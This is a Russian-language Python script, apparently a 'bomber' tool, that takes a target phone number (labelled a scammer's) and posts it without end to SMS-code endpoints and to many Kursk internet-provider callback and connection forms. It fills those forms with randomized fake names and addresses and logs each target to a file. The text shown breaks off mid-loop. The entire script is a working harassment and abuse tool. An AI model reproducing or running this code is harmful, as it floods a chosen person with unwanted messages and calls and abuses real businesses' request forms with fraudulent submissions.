import datetime
import random
import time

import requests
from colorama import init, Fore

init()

n0 = (
'Евгений', 'Елена', 'Екатерина', 'Наталья', 'Светлана' 'Олег' 'Егор', 'Дмитрий', 'Амир', 'Артем', 'Владислав', 'Эдуард',
'Никита')
nnf0 = ('Евгений Петрович', 'Евгений Алексеевич', 'Александра Эдуардовна', 'Наталья Андреевна', 'Дмитрий Олегович',
        'Эдуард Арсеньевич')
nf0 = ('Евгений Дорошев', 'Евгений Оловянников', 'Полина Дубкова', 'Дмитрий Собакин')
nff0 = (
    'Дорошев Евгений Петрович', 'Лисицына Елена Григорьевна', 'Печев Александр Романович', 'Собакин Дмитрий Алексеевич',
    'Болочевский Арсений Иванович', 'Авилов Эдуард Николаевич', 'Шевченко Максим Петрович')
d0 = (
'1', '1А', '2', '2А', '3', '3А', '4', '4А', '5', '5А', '6', '6А', '1Б', '1В', '2Б', '2В', '3Б', '3В', '4Б', '4В', '5Б',
'5В', '6Б', '6В')
st0 = ('Народная', 'Серегина', 'Гагарина', 'Пр-кт Победы', 'Магистральный пр-д', 'Черняховского', 'Краснополянская',
       'пр-кт Клыкова')
kv0 = ('13', '12', '14', '15', '9', '26', '14', '28', '56', '70', '91', '16', '18', '31', '32', '36', '69', '46')
ckb0 = ('Видеонаблюдение', 'Интернет', 'Телевидение')

ph = ('oYWtPLP', 'EUCVP', 'CnLF', 'MTMR', 'TetTG', 'FNLC.Project')

n = random.choice(n0)
nnf = random.choice(nnf0)
nf = random.choice(nf0)
nff = random.choice(nff0)
d = random.choice(d0)
st = random.choice(st0)
kv = random.choice(kv0)
ckb = random.choice(ckb0)
city = 'Курск'

hello = """
***************************************************************************

   \|!         Б0мб3р Сп3циальн0г0 Назнач3ния                     
    !|\                                  
     \|!                                 10.2023        v-2.0      
      !|\      FNLC.Project"""
banner0 = """
 ____________________________________________________
|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|             +7
|ELECOM, СВОЛОЧЬ S,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|         .   (9
|MTS,ROSTELECOM,DOM.RU,MTS,RO ШАКАЛ M,DOM.RU,MTS,ROST|         0123456789
|ELECOM, ПАСКУДА S,R ------- ,DOM.RU,MTS,ROSTELECOM,D|         0123456789)
|MTS,ROSTELECOM,DOM. ЫЬЙРАК OSTELECOM,DOM.RU,M И ROST|            |    |
|ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTE Ш OM,D|         0123456789
|MTS,ROSTE?    заеб 200%                 .RU,M А ROST|         0123456789
|ELECOM,DO! выполняет функции инквизиции 'OSTE К OM,D|         0123456789
|MTS,ROSTE   кредиотование (ну почти)    .RU,MTS,ROST|           | -|
|ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|         0123456789
|MTS, ТВАРЪ COM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|         0123456789
|ELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,D|             -  |
|MTS,ROSTELECOM,DOM.RU,MTS,ROSTELECOM,DOM.RU,MTS,ROST|         0123456789
|____________________________________________________|         0123456789
                                                                    '"""
print(Fore.LIGHTYELLOW_EX + hello)
print(Fore.LIGHTGREEN_EX + banner0)
print(Fore.LIGHTRED_EX + random.choice(ph))
try:
    chs = input(Fore.CYAN + '''БОМБЕР - 1
    KILLPHONE - 2
        Логи - 3
            KILLPHONE+БОМБЕР - любое другое
        Действие: ''')
    if chs == '1':
        try:
            try:
                f = open('blog.txt', 'r+')
                f.close()
            except:
                f = open('blog.txt', 'w')
            f = open('blog.txt', 'r+')
            dly = input(Fore.BLUE + 'Задержка(Стандарт 0):')
            phn = input(Fore.RESET + "Номер афериста: + ")
            p0 = phn[0]
            p1 = phn[1]
            p2 = phn[2]
            p3 = phn[3]
            p4 = phn[4]
            p5 = phn[5]
            p6 = phn[6]
            p7 = phn[7]
            p8 = phn[8]
            p9 = phn[9]
            p10 = phn[10]
            phn0 = phn[1:10]
            phn1 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8}{p9}{p10}'
            phn2 = f'+{p0}({p1}{p2}{p3})-{p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn4 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn5 = f'8 ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn6 = f'+{p0}({p1}{p2}{p3}){p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            f.write(f'''
        {datetime.datetime.now()}:
                    +{phn}

        {f.readline(1)}''')
            f.close()
            while True:
                try:
                    while True:
                        try:
                            r = requests.post('https://bvbinfo.ru/api/v1/accounts/express_registration/',
                                              data={'phone': f'{p0}{p1}{p2}{p3}{p4}{p5}{p6}{p7}{p8}{p9}{p10}',
                                                    'role': '3'},
                                              headers={})
                            print(Fore.CYAN + """https://bvbinfo.ru
                                                        Заявка отправлена...""")
                            if r.status_code == 201:
                                print(Fore.GREEN + """Успешно
                                                                                                        """)
                            elif r.status_code == 400:
                                print(Fore.RED + """Безуспешно
                                                                                                    """)
                            else:
                                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                                                     """)
                            try:
                                print(Fore.BLUE + f'Жду {dly}')
                                time.sleep(float(dly))
                            except:
                                    print('Не жду')
                        except:
                            print(Fore.RED + """Сервис не отвечает
                                                                                       """)

                        try:
                            r = requests.post('https://ohotaktiv.ru/12dev/auth/auth.php?phone=9192796895',
                                              data={'phone': f'{p1}{p2}{p3}{p4}{p5}{p6}{p7}{p8}{p9}{p10}', },
                                              headers={})
                            print(Fore.CYAN + """https://ohotactiv.ru
                                                        Заявка отправлена...""")
                            if r.status_code == 200:
                                print(Fore.GREEN + """Успешно
                                                                                                        """)
                            elif r.status_code == 400:
                                print(Fore.RED + """Безуспешно
                                                                                                    """)
                            else:
                                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                                                     """)
                            try:
                                print(Fore.BLUE + f'Жду {dly}')
                                time.sleep(float(dly))
                            except:
                                    print('Не жду')
                        except:
                            print(Fore.RED + """Сервис не отвечает
                                                                                       """)

                        try:
                            r = requests.post('https://api.dodomino.ru/api/app/auth/code-request',
                                              data={'phone': f'{p0}({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}', },
                                              headers={})
                            print(Fore.CYAN + """https://domino.ru
                                                        Заявка отправлена...""")
                            if r.status_code == 200:
                                print(Fore.GREEN + """Успешно
                                                                                                        """)
                            elif r.status_code == 400:
                                print(Fore.RED + """Безуспешно
                                                                                                    """)
                            else:
                                print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                                                     """)
                            try:
                                print(Fore.BLUE + f'Жду {dly}')
                                time.sleep(float(dly))
                            except:
                                    print('Не жду')
                        except:
                            print(Fore.RED + """Сервис не отвечает
                                                                                       """)

                except:
                    print(Fore.RED + """idk_lol""")
        except:
            print(Fore.RED + 'Неправильно набран номер или установлена задержка')

    elif chs == '2':
        try:
            try:
                f = open('blog.txt', 'r+')
                f.close()
            except:
                f = open('blog.txt', 'w')
            f = open('blog.txt', 'r+')
            dly = input(Fore.BLUE + 'Задержка(Стандарт 0):')
            phn = input(Fore.RESET + "Номер афериста: + ")
            p0 = phn[0]
            p1 = phn[1]
            p2 = phn[2]
            p3 = phn[3]
            p4 = phn[4]
            p5 = phn[5]
            p6 = phn[6]
            p7 = phn[7]
            p8 = phn[8]
            p9 = phn[9]
            p10 = phn[10]
            phn0 = phn[1:10]
            phn1 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8}{p9}{p10}'
            phn2 = f'+{p0}({p1}{p2}{p3})-{p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn4 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn5 = f'8 ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn6 = f'+{p0}({p1}{p2}{p3}){p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            f.write(f'''
        {datetime.datetime.now()}:
                    +{phn}

        {f.readline(1)}''')
            f.close()
            while True:
                try:
                    r = requests.post('https://www.r46.ru/flat.php', data={'fio_application': nnf,
                                                                           'phone_application': phn,
                                                                           'street_application': st,
                                                                           'home_application': d,
                                                                           'hide_field': None,
                                                                           'three_days_record': '1',
                                                                           'oborud_videocamera': '1',
                                                                           'smarthome_smartbarrier': '1',
                                                                           'smarthome_smartintercom': '1',
                                                                           'submit_application': 'Оставить заявку'},
                                      headers={})
                    print(Fore.CYAN + """https://www.r46.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                                            """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                                        """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                         """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                            """)
                try:
                    r = requests.post(
                        'https://rem-bt-pro.online/addorders.xphp?idp=de8430e8-a41b-cc0b-a7d61dbc51c5c29b',
                        data={'phone': phn4}, headers={})
                    print(Fore.CYAN + """https://rem-bt-pro.online
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                                            """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                                        """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                         """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                            """)
                try:
                    r = requests.post('https://kursk.gigaboom.ru/crm/send/modal-callback/',
                                      data={'call_time': 'Как можно скорее',
                                            'customer_text': None,
                                            'name': n,
                                            'phone': phn4,
                                            'provider_name': None}, headers={})
                    print(Fore.CYAN + """https://kursk.gigaboom.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                                    """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                                """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                 """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                        """)
                try:
                    r = requests.post('https://forms.tildacdn.com/procces/',
                                      data={'formservices[]': 'fb4f2fd9f03ea82aed610f3e0692f721',
                                            'Phone': phn,
                                            'form-spec-comments': None,
                                            'tildaspec-cookie': None,
                                            'tildaspec-referer': 'https://www.montagvsem.ru/#contacts',
                                            'tildaspec-formid': 'form502661400',
                                            'tildaspec-formskey': 'e914884bdc7c850291ec170bf31d9eec',
                                            'tildaspec-version-lib': ' 02.001',
                                            'tildaspec-pageid': '13107907',
                                            'tildaspec-projectid': '2823067',
                                            'tildaspec-lang': 'RU',
                                            'tildaspec-fp': 'st14157w773h790ft60814157'}, headers={})
                    print(Fore.CYAN + """https://forms.tildacdn.com
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                       """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                     """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                """)
                try:
                    r = requests.post('https://kursk.mtsru.ru/connect', data={'submitted': '10264',
                                                                              'isPopup10264': '0',
                                                                              'fields[10270]': '0',
                                                                              'fields[10265]': phn1,
                                                                              'fields[10266]': nff,
                                                                              'fields[10267]': city,
                                                                              'fields[10268]': st,
                                                                              'fields[10269]': d,
                                                                              'fields[10271]': kv,
                                                                              'fields[0]': '3b6ace0e58546ed19bdb2d629f1d38593',
                                                                              'fields[1': None}, headers={})
                    print(Fore.CYAN + """https://kursk.mtsru.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                            """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                             """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                        """)
                try:
                    r = requests.post('https://kursk.domconnect.ru/ajax/activeform?sendedsourceid=106',
                                      data={'sendedsourceid': '106',
                                            'formname': 'call-me-consult',
                                            'sendedphone': phn4}, headers={})
                    print(Fore.CYAN + """https://https://kursk.domconnect.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                    """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                     """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                """)
                try:
                    r = requests.post('https://kursk-rt.ru/wp-admin/admin-ajax.php',
                                      data={'action': 'send_form_this_modal',
                                            'resurs[name]': nff,
                                            'resurs[phone]': f'{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8} {p9}{p10}',
                                            'resurs[street]': st,
                                            'resurs[home]': d,
                                            'resurs[kvart]': kv}, headers={})
                    print(Fore.CYAN + """https://kursk-rt.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                    """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                 """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                            """)
                try:
                    r = requests.post('https://kursk.telekom-internet.ru/wp-admin/admin-ajax.php', data={'art_name': nf,
                                                                                                         'art_tel': phn,
                                                                                                         'art_street': st,
                                                                                                         'art_home': d,
                                                                                                         'art_kv': kv,
                                                                                                         'art_url': 'https://kursk.telekom-internet.ru/internet-v-kvartiru',
                                                                                                         'art_anticheck': 'true',
                                                                                                         'art_submitted': None,
                                                                                                         'action': 'feedback_action',
                                                                                                         'nonce': 'f884acba78'},
                                      headers={})
                    print(Fore.CYAN + """https://kursk.telekom-internet.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                    """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                     """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                """)
                try:
                    r = requests.post('https://kursk.tvoi-provider.ru/actions/formResponse.php', data={'f50name': nf,
                                                                                                       'f50phone': phn6,
                                                                                                       'formCode': 'callConnect',
                                                                                                       'formName': 'Подключиться к оператору'},
                                      headers={})
                    print(Fore.CYAN + """https://kursk.tvoi-provider.ru:
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                    """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                     """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                """)
                try:
                    r = requests.post('https://internet.gde-luchshe.ru/api/v1/calls/new/', data={'call[phone]': phn4,
                                                                                                 'provider_alias': 'ertelecom'},
                                      headers={})
                    print(Fore.CYAN + """https://internet.gde-luchshe.ru:
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                    """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                 """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                            """)
                try:
                    r = requests.post('https://kursk.internetv-dom.ru/connect', data={'submitted': '16792',
                                                                                      'isPopup16792': '0',
                                                                                      'fields[16794]': '0',
                                                                                      'fields[16795]': phn1,
                                                                                      'fields[16796]': nff,
                                                                                      'fields[16797]': city,
                                                                                      'fields[16798]': st,
                                                                                      'fields[16799]': d,
                                                                                      'fields[16800]': kv,
                                                                                      'fields[16802]': '1',
                                                                                      'fields[16804]': None,
                                                                                      'fields[0]': '833f7326312f8e31d13de9b8905a7b283',
                                                                                      'fields[1': None}, headers={})
                    print(Fore.CYAN + """https://kursk.internetv-dom.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                    """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                     """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                """)
                try:
                    r = requests.post('https://ks.wifire.ru/form/mail-sender',
                                      data={'form_name': 'express_form_ccmp_short',
                                            'city': f'Wifire {city}',
                                            'clientName': n,
                                            'clientPhone': phn6,
                                            'clientAddress': None,
                                            'house_guid': None,
                                            'clientSite': ' ks.wifire.ru/nadolgo',
                                            'calltracking_params': None,
                                            'tariffId': '4276',
                                            'tariffName': '#ДляДома Турбо',
                                            'comment': '#ДляДома Турбо'}, headers={})

                    print(Fore.CYAN + """https://ks.wifire.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                    """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                     """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                """)
                try:
                    r = requests.post('https://kursk-wifire.ru/ajax/saveorder.php', data={'fio': nff,
                                                                                          'phone': phn,
                                                                                          'address': f'г.{city}, ул.{st}, д.{d}',
                                                                                          'tarif_id': '0',
                                                                                          'refmodal': 'returncall-banner',
                                                                                          'connect_type': '1',
                                                                                          'wifi': '0',
                                                                                          'buy_router': '0',
                                                                                          'tvmodul': '0',
                                                                                          'buy_tvmodul': '0'},
                                      headers={})
                    print(Fore.CYAN + """https://kursk-wifire.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                                """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                            """)
                try:
                    r = requests.post('https://moscow.home.megafon.ru/form/mail-sender',
                                      data={'clientSite': 'moscow.home.megafon.ru/',
                                            'form_name': 'express_form_ccmp_short',
                                            'clientName': n,
                                            'clientPhone': phn6,
                                            'city': 'Москва и область',
                                            'clientAddress': None,
                                            'house_guid': None,
                                            'tariffId': '5989',
                                            'tariffName': 'Объединяй! Максимум',
                                            'comment': 'Объединяй! Максимум 650₽',
                                            'calltracking_params': None}, headers={})

                    print(Fore.CYAN + """https://moscow.home.megafon.ru
                            Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                                """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                            """)
                print(Fore.LIGHTYELLOW_EX + 'Цикл завершен')
        except:
            print(Fore.RED + 'Неправильно набран номер или установлена задержка')

    elif chs == '28':
        f = open('blog.txt', 'r')
        print(f.read())
        f.close()
    elif chs == '28':
        f = open('blog.txt', 'w')
        f.write(f'''{datetime.datetime.now()}:
            ЛОГИ ЗАЧИЩЕННЫ  

''')
        f.close()
    elif chs == '29':
        f = open('blog.txt', 'r+')
        fakephn = input('Номер: ')
        f.write(f'''{datetime.datetime.now()}:
            +{fakephn}
            
{f.readline(1)}''')
    else:
        try:
            try:
                f = open('blog.txt', 'r+')
                f.close()
            except:
                f = open('blog.txt', 'w')
            f = open('blog.txt', 'r+')
            dly = input(Fore.BLUE + 'Задержка(Стандарт 0):')
            phn = input(Fore.RESET + "Номер афериста: + ")
            p0 = phn[0]
            p1 = phn[1]
            p2 = phn[2]
            p3 = phn[3]
            p4 = phn[4]
            p5 = phn[5]
            p6 = phn[6]
            p7 = phn[7]
            p8 = phn[8]
            p9 = phn[9]
            p10 = phn[10]
            phn0 = phn[1:10]
            phn1 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8}{p9}{p10}'
            phn2 = f'+{p0}({p1}{p2}{p3})-{p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn4 = f'+{p0} ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn5 = f'8 ({p1}{p2}{p3}) {p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            phn6 = f'+{p0}({p1}{p2}{p3}){p4}{p5}{p6}-{p7}{p8}-{p9}{p10}'
            f.write(f'''
{datetime.datetime.now()}:
            +{phn}
            
{f.readline(1)}''')
            f.close()
            while True:
                try:
                    r = requests.post('https://www.r46.ru/flat.php', data={'fio_application': nnf,
                                                                           'phone_application': phn,
                                                                           'street_application': st,
                                                                           'home_application': d,
                                                                           'hide_field': None,
                                                                           'three_days_record': '1',
                                                                           'oborud_videocamera': '1',
                                                                           'smarthome_smartbarrier': '1',
                                                                           'smarthome_smartintercom': '1',
                                                                           'submit_application': 'Оставить заявку'},
                                      headers={})
                    print(Fore.CYAN + """https://www.r46.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                                    """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                                """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                 """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                    """)
                try:
                    r = requests.post(
                        'https://rem-bt-pro.online/addorders.xphp?idp=de8430e8-a41b-cc0b-a7d61dbc51c5c29b',
                        data={'phone': phn4}, headers={})
                    print(Fore.CYAN + """https://rem-bt-pro.online
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                                    """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                                """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                                 """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                    """)
                try:
                    r = requests.post('https://kursk.gigaboom.ru/crm/send/modal-callback/',
                                      data={'call_time': 'Как можно скорее',
                                            'customer_text': None,
                                            'name': n,
                                            'phone': phn4,
                                            'provider_name': None}, headers={})
                    print(Fore.CYAN + """https://kursk.gigaboom.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                            """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                                        """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                                         """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                                """)
                try:
                    r = requests.post('https://forms.tildacdn.com/procces/',
                                      data={'formservices[]': 'fb4f2fd9f03ea82aed610f3e0692f721',
                                            'Phone': phn,
                                            'form-spec-comments': None,
                                            'tildaspec-cookie': None,
                                            'tildaspec-referer': 'https://www.montagvsem.ru/#contacts',
                                            'tildaspec-formid': 'form502661400',
                                            'tildaspec-formskey': 'e914884bdc7c850291ec170bf31d9eec',
                                            'tildaspec-version-lib': ' 02.001',
                                            'tildaspec-pageid': '13107907',
                                            'tildaspec-projectid': '2823067',
                                            'tildaspec-lang': 'RU',
                                            'tildaspec-fp': 'st14157w773h790ft60814157'}, headers={})
                    print(Fore.CYAN + """https://forms.tildacdn.com
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                               """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                             """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                        """)
                try:
                    r = requests.post('https://kursk.mtsru.ru/connect', data={'submitted': '10264',
                                                                              'isPopup10264': '0',
                                                                              'fields[10270]': '0',
                                                                              'fields[10265]': phn1,
                                                                              'fields[10266]': nff,
                                                                              'fields[10267]': city,
                                                                              'fields[10268]': st,
                                                                              'fields[10269]': d,
                                                                              'fields[10271]': kv,
                                                                              'fields[0]': '3b6ace0e58546ed19bdb2d629f1d38593',
                                                                              'fields[1': None}, headers={})
                    print(Fore.CYAN + """https://kursk.mtsru.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                        """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                    """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                     """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                """)
                try:
                    r = requests.post('https://kursk.domconnect.ru/ajax/activeform?sendedsourceid=106',
                                      data={'sendedsourceid': '106',
                                            'formname': 'call-me-consult',
                                            'sendedphone': phn4}, headers={})
                    print(Fore.CYAN + """https://https://kursk.domconnect.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                            """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                             """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                        """)
                try:
                    r = requests.post('https://kursk-rt.ru/wp-admin/admin-ajax.php',
                                      data={'action': 'send_form_this_modal',
                                            'resurs[name]': nff,
                                            'resurs[phone]': f'{p0} ({p1}{p2}{p3}) {p4}{p5}{p6} {p7}{p8} {p9}{p10}',
                                            'resurs[street]': st,
                                            'resurs[home]': d,
                                            'resurs[kvart]': kv}, headers={})
                    print(Fore.CYAN + """https://kursk-rt.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                            """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                        """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                         """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                    """)
                try:
                    r = requests.post('https://kursk.telekom-internet.ru/wp-admin/admin-ajax.php', data={'art_name': nf,
                                                                                                         'art_tel': phn,
                                                                                                         'art_street': st,
                                                                                                         'art_home': d,
                                                                                                         'art_kv': kv,
                                                                                                         'art_url': 'https://kursk.telekom-internet.ru/internet-v-kvartiru',
                                                                                                         'art_anticheck': 'true',
                                                                                                         'art_submitted': None,
                                                                                                         'action': 'feedback_action',
                                                                                                         'nonce': 'f884acba78'},
                                      headers={})
                    print(Fore.CYAN + """https://kursk.telekom-internet.ru
                    Заявка отправлена...""")
                    if r.status_code == 200:
                        print(Fore.GREEN + """Успешно
                                                """)
                    elif r.status_code == 400:
                        print(Fore.RED + """Безуспешно
                                            """)
                    else:
                        print(Fore.YELLOW + f"""Не удалось разобрать ({r.status_code})
                                             """)
                    try:
                        print(Fore.BLUE + f'Жду {dly}')
                        time.sleep(float(dly))
                    except:
                        print('Не жду')
                except:
                    print(Fore.RED + """Сервис не отвечает
                                        """)
                try:
